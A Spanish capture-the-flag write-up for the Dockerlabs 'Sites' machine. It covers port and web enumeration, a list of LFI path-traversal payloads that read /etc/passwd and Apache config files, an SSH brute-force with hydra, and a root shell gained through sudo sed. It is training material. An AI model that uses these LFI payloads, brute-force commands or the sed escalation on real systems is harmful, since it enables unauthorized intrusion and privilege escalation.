
# Writeup Template: Maquina `[ Sites ]`

- Tags: #Sites
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Sites](https://mega.nz/file/tT8RXaJB#K5air4Vs7CCMbCz7leZLUmkoPkei3k6mV60pJHNJO78) 

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x sites.zip
sudo bash auto_deploy.sh sites.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio  Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 3591]
/vulnerable.php       (Status: 200) [Size: 37]
```

Ingresamos al archivo **php**
```bash
http://172.17.0.2/vulnerable.php
```

Tenemos lo siguiente que parece que esta esperando un pagaina o un nombre de usuario:
```bash
Please provide a page or a username.
```

Ahora investigare si es que esta realizando una llamada bajo un parametro:
```bash
wfuzz -c -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://172.17.0.2/vulnerable.php?FUZZ=../../../etc/passwd" --hl=1
```

Vemos que es vulnerable a **LFI**
```bash
wfuzz -c -t 50 -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/vulnerable.php?page=FUZZ" --hw=0
```

Tenemos estas posibilidades de incluir archivos del sistema:
```bash
"/etc/group"                                                                       
"/etc/fstab"                                                                       
"/etc/apt/sources.list"                                                            
"/etc/apache2/apache2.conf"                                                        
"/etc/hosts.deny"                                                                  
"../../../../../../../../../../../../etc/hosts"                                    
"/etc/hosts.allow"                                                                 
"/etc/hosts"                                                                       
"../../../../../../../../../../../../../../../../etc/passwd"                       
"/etc/init.d/apache2"                                                              
"../../../../../../../../../etc/passwd"                                            
"../../../../../../../../etc/passwd"                                               
"../../../../../../../../../../etc/passwd"                                         
"../../../../../../../../../../../../../etc/passwd"                                
"../../../../../../../../../../../etc/passwd"                                      
"../../../../../../../../../../../../../../etc/passwd"                             
"../../../../../../../../../../../../etc/passwd"                                   
"../../../../../../../../../../../../../../../../../etc/passwd"                    
"/etc/passwd"                                                                      
"../../../../../../../../../../../../../../../../../../../../etc/passwd"           
"../../../../../../../../../../../../../../../../../../etc/passwd"                 
"../../../../../../../../../../../../../../../../../../../../../etc/passwd"        
"../../../../../../../../../../../../../../../etc/passwd"                          
"../../../../../../../../../../../../../../../../../../../../../../etc/passwd"     
"../../../../../../../../../../../../../../../../../../../etc/passwd"              
"/../../../../../../../../../../etc/passwd"                                        
"/./././././././././././etc/passwd"                                                
"/etc/nsswitch.conf"                                                               
"../../../../../etc/passwd"                                                        
"/etc/issue"                                                                       
"../../../../../../../etc/passwd"                                                  
"../../../../../../etc/passwd&=%3C%3C%3C%3C"                                       
"../../../etc/passwd"                                                              
"../../../../../../etc/passwd"                                                     
"../../../../etc/passwd"                                                           
"/etc/resolv.conf"                                                                 
"/etc/ssh/sshd_config"                                                             
"/etc/rpc"                                                                         
"/proc/mounts"                                                                     
"/proc/version"                                                                    
"/proc/partitions"                                                                 
"/proc/net/route"                                                                  
"/proc/loadavg"                                                                    
"/proc/net/dev"                                                                    
"/proc/meminfo"                                                                    
"/proc/cpuinfo"                                                                    
"/proc/net/arp"                                                                    
"/proc/net/tcp"                                                                    
"///////../../../etc/passwd"                                                       
"..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                           
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"              
"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
"/proc/self/status"                                                                
"/proc/self/cmdline"                                                               
```

Listamos el contenido del archivo: **passwd**
```bash
http://172.17.0.2/vulnerable.php?page=/etc/passwd
```
### Credenciales Encontradas
Tenemos un usuario **Chocolate** valido para el sistema que le aplicaremos fuerza bruta:
```bash
hydra -l chocolate -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://172.17.0.2
```

No obtuvimos nada.

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora desde la web principal tenemos que indica que en esta carpeta: **`sites-enabled`** se encuentra este archivo: **`sitio.conf`** Ahora nos aprovechamos de esto para intentar apuntar a este archivo atraves del **LFI**

### Ejecucion del Ataque
```bash
# Comandos para explotación
http://172.17.0.2/vulnerable.php?page=/etc/apache2/sites-enabled/sitio.conf
```

Tenemos la siguiente informacion:
```bash
ServerAdmin webmaster@tusitio.com DocumentRoot /var/www/html ServerName sitio.dl ServerAlias www.sitio.dl Options Indexes FollowSymLinks AllowOverride All Require all granted # Bloquear acceso al archivo archivitotraviesito (cuidadito cuidadin con este regalin) # # Require all denied # ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined
```

Ahora revisamos que exista este archivo:
```bash
http://172.17.0.2/archivitotraviesito
```

```bash
Muy buen, has entendido el funcionamiento de un LFI y los archivos interesantes a visualizar dentro de apache, ahora te proporciono el acceso por SSH, pero solo la password, para practicar un poco de bruteforce (para variar)

lapasswordmasmolonadelacity
```

Ya que solo tenemos la contrasena y Sabemos que mediante el archivo **passwd** vimos que existe un usuario **chocolate** asi que probaremos conectarnos con estas credenciales
### Intrusion
Nos conectamos por **ssh**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh chocolate@172.17.0.2
```

---
## Escalada de Privilegios

###### Usuario `[ Chocolate ]`:
Listando permisos para este usuario tenemos lo siguiente:
```bash
sudo -l

User chocolate may run the following commands on 8428616f3407:
    (ALL) NOPASSWD: /usr/bin/sed
```

Nos aprovechamos para explotar el binario:
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a abusar de un parametro en la consulta **php** para derivarlo a un **LFI**
2. Aprendimos a abusar del bianario de **sed** para ganar acceso como **root**